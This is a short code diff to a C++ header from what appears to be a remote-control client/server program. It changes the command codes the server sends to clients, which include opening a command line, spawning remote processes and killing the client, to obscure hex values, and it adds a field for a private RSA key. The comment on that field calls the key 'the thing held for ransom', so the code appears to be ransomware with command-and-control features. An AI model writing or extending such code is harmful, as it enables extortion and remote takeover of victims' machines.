@@ -12,11 +12,12 @@ enum ClientResponseCode {
 // Enums dictating which action to perform on the client
 // Sent from the server to client
 enum RemoteAction {
-    NONE                = -1,
-    USE_CLI             = 1,
-    OPEN_REMOTE_PROCESS = 4,
-    KILL_CLIENT         = 5, // forcefully disconnect the client
-    PING_CLIENT = 6,
+    NONE                  = -1,
+    USE_CLI               = 0x832182,
+    OPEN_REMOTE_PROCESS   = 0x317238,
+    KILL_CLIENT           = 0x821921, // forcefully disconnect the client
+    PING_CLIENT           = 0x94932,
+    RETURN_PUBLIC_RSA_KEY = 0x403920, // respond to a request that asked for a public rsa key
 };
 
 enum SocketTypes {
@@ -101,6 +102,15 @@ typedef struct {
         encryption key. Used to encrypt.
     */
     std::string        publicEncryptionKey;
+
+    /*
+        The RSA Private key the client can use to decrypt
+        anything encrypted with the 'publicEncryptionKey'
+
+        Usually the thing held for ransom, so a check should
+        be held if a ransom has been paid.
+    */
+    std::string        privateEncryptionKey;
 
     // the action to perform of RemoteAction enum
     RemoteAction       action;
